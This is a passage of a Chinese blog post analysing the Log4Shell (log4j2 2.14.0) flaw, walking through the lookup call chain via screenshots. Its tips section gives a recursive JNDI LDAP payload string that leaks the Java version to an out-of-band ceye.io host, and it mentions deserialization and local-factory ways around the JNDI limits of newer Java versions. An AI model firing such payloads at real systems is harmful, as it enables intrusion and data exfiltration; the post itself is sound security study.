+<p>首先我看先看一下这个format方法里面的<font color=red>offset</font><br>他其实就是获取我们log4j2.xml里面的日志输出前缀，然后把msg里面的messageFormat加到workingBuilder里面，下面的for循环是判断字符串里面是否存在${，如果存在那么去<font color=red>substring</font>获取这个范围的字符串，其实就是获取用户输入的字符串。</p>
+<p><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790418651892.jpg"></p>
+<p>这里获取到用户输入的value，然后调用<font color=red>replace</font><br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790428038870.jpg"></p>
+<p><font color=red>replace</font>又去调用<font color=red>substitute</font><br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790429142937.jpg"></p>
+<p>接着<font color=red>substitute</font>又去调用<font color=red>substitute</font><br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790434101896.jpg"></p>
+<p>调用substitute之后获取到了varName，调用<font color=red>resolveVariable</font>，<br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790436727911.jpg"></p>
+<p><font color=red>resolveVariable</font>再进行调用<font color=red>lookup</font><br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790437478732.jpg"></p>
+<p>lookup里面将prefix、name取出，然后调用lookup这个map，这个map为之前介绍的strLookupMap。<br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790438639330.jpg"></p>
+<p>因为我们写的调用为${java:version}，所以他会走到JavaLookup这个里面的lookup里面。<br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790440268620.jpg"></p>
+<p>之后运行结束得到结果：<br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790440670210.jpg"></p>
+<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><h4 id="支持递归"><a href="#支持递归" class="headerlink" title="支持递归"></a>支持递归</h4><p>substitute里面通过while循环去递归匹配查询${，所以我们可以写入如下payload：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String a=<span class="string">&quot;$&#123;jndi:ldap://$&#123;java:version&#125;.xxxxx.ceye.io&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="高版本jndi"><a href="#高版本jndi" class="headerlink" title="高版本jndi"></a>高版本jndi</h4><p>jndi的ldap默认支持8版本191版本之前的，要想突破高版本的现在，目前我了解了两种方法可以绕过高版本限制：</p>
+<ul>
+<li>通过反序列化去绕过</li>
+<li>使用目标本地工厂类</li>
+</ul>
+<p>因为这两个点内容也很多，后面文章再补充这方面的知识。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/JAVASEC/" rel="tag"># JAVASEC</a>
+              <a href="/tags/log4j2/" rel="tag"># log4j2</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/03/14/shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="prev" title="shiro 1.2.4反序列化命令执行漏洞分析">
+      <i class="fa fa-chevron-left"></i> shiro 1.2.4反序列化命令执行漏洞分析
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">log4jshell-2.14.0漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="nav-number">1.1.</span> <span class="nav-text">环境准备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tips"><span class="nav-number">1.3.</span> <span class="nav-text">tips</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%AF%E6%8C%81%E9%80%92%E5%BD%92"><span class="nav-number">1.3.1.</span> <span class="nav-text">支持递归</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%AB%98%E7%89%88%E6%9C%ACjndi"><span class="nav-number">1.3.2.</span> <span class="nav-text">高版本jndi</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">f19t</p>
+  <div class="site-description" itemprop="description">个人学习的一些记录。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <!--
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">f19t</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
